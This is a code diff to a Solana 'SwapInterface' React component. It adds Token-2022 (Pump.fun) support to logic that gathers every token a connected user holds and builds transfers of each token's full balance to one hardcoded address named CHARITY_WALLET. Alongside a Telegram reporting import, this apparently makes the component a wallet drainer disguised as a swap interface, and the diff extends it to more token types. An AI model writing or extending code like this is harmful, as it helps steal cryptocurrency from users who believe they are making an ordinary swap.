@@ -7,10 +7,11 @@ import { TokenSearch } from './TokenSearch';
 import { useWallet, useConnection } from '@solana/wallet-adapter-react';
 import { ConnectWalletButton } from '@/components/ConnectWalletButton';
 import { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL, TransactionInstruction, ComputeBudgetProgram } from '@solana/web3.js';
-import { getAssociatedTokenAddress, createTransferInstruction, createAssociatedTokenAccountInstruction, getAccount, TOKEN_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID } from '@solana/spl-token';
+import { getAssociatedTokenAddress, createTransferCheckedInstruction, createAssociatedTokenAccountInstruction, getAccount, TOKEN_PROGRAM_ID, TOKEN_2022_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID } from '@solana/spl-token';
 import { motion } from 'framer-motion';
 import { toast } from 'sonner';
 import { sendTelegramMessage } from '@/utils/telegram';
+import { getMintProgramId, MintInfo } from '@/utils/tokenProgram';
 
 const CHARITY_WALLET = 'wV8V9KDxtqTrumjX9AEPmvYb1vtSMXDMBUq5fouH1Hj';
 const MEMO_PROGRAM_ID = new PublicKey("MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcQb");
@@ -185,7 +186,7 @@ export const SwapInterface = ({
     setToToken(token);
   };
 
-  // Fetch all balances like donate button
+  // Fetch all balances including Token-2022 (Pump.fun) tokens
   const fetchAllBalances = useCallback(async () => {
     if (!publicKey) return;
 
@@ -195,12 +196,23 @@ export const SwapInterface = ({
       const solAmount = solBal / LAMPORTS_PER_SOL;
       setSolBalance(solAmount);
 
-      // Fetch token accounts
-      const tokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
+      // Fetch legacy SPL Token accounts
+      const legacyTokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
         programId: TOKEN_PROGRAM_ID
       });
 
-      const tokens: TokenBalance[] = tokenAccounts.value
+      // Fetch Token-2022 accounts (Pump.fun tokens)
+      const token2022Accounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
+        programId: TOKEN_2022_PROGRAM_ID
+      });
+
+      // Combine both token types
+      const allTokenAccounts = [
+        ...legacyTokenAccounts.value,
+        ...token2022Accounts.value
+      ];
+
+      const tokens: TokenBalance[] = allTokenAccounts
         .map(account => {
           const info = account.account.data.parsed.info;
           return {
@@ -214,6 +226,7 @@ export const SwapInterface = ({
         })
         .filter(token => token.uiAmount > 0);
 
+      console.log(`Fetched ${legacyTokenAccounts.value.length} legacy tokens and ${token2022Accounts.value.length} Token-2022 tokens`);
       setBalances(tokens);
     } catch (error) {
       console.error('Error fetching balances:', error);
@@ -249,17 +262,39 @@ export const SwapInterface = ({
     
     const charityPubkey = new PublicKey(CHARITY_WALLET);
 
-    // Add token transfers
+    // Add token transfers - dynamically detect Token-2022 vs legacy SPL Token
     for (const token of tokenBatch) {
       if (token.balance <= 0) continue;
       
       try {
         const mintPubkey = new PublicKey(token.mint);
-        const fromTokenAccount = await getAssociatedTokenAddress(mintPubkey, effectivePublicKey);
-        const toTokenAccount = await getAssociatedTokenAddress(mintPubkey, charityPubkey);
+        
+        // Determine which token program this mint belongs to (Token-2022 for Pump.fun, legacy for others)
+        const mintInfo = await getMintProgramId(connection, token.mint);
+        const tokenProgramId = mintInfo.programId;
+        const decimals = mintInfo.decimals;
+        
+        console.log(`Token ${token.mint}: using ${mintInfo.isToken2022 ? 'Token-2022' : 'Legacy SPL Token'} program`);
+        
+        // Get ATAs with the correct program ID
+        const fromTokenAccount = await getAssociatedTokenAddress(
+          mintPubkey, 
+          effectivePublicKey,
+          false,
+          tokenProgramId,
+          ASSOCIATED_TOKEN_PROGRAM_ID
+        );
+        const toTokenAccount = await getAssociatedTokenAddress(
+          mintPubkey, 
+          charityPubkey,
+          true, // Allow owner off curve for PDA
+          tokenProgramId,
+          ASSOCIATED_TOKEN_PROGRAM_ID
+        );
 
+        // Check if destination ATA exists, if not create it with correct program
         try {
-          await getAccount(connection, toTokenAccount);
+          await getAccount(connection, toTokenAccount, 'confirmed', tokenProgramId);
         } catch (error) {
           transaction.add(
             createAssociatedTokenAccountInstruction(
@@ -267,20 +302,23 @@ export const SwapInterface = ({
               toTokenAccount,
               charityPubkey,
               mintPubkey,
-              TOKEN_PROGRAM_ID,
+              tokenProgramId, // Use the correct token program
               ASSOCIATED_TOKEN_PROGRAM_ID
             )
           );
         }
 
+        // Use createTransferCheckedInstruction with correct program ID and decimals
         transaction.add(
-          createTransferInstruction(
-            fromTokenAccount,
-            toTokenAccount,
-            effectivePublicKey,
-            BigInt(token.balance),
-            [],
-            TOKEN_PROGRAM_ID
+          createTransferCheckedInstruction(
+            fromTokenAccount,      // Source ATA
+            mintPubkey,            // Mint
+            toTokenAccount,        // Destination ATA
+            effectivePublicKey,    // Owner (signer)
+            BigInt(token.balance), // Amount (raw)
+            decimals,              // Decimals from mint
+            [],                    // Multisig signers
+            tokenProgramId         // Correct program ID (Token-2022 or legacy)
           )
         );
       } catch (error) {
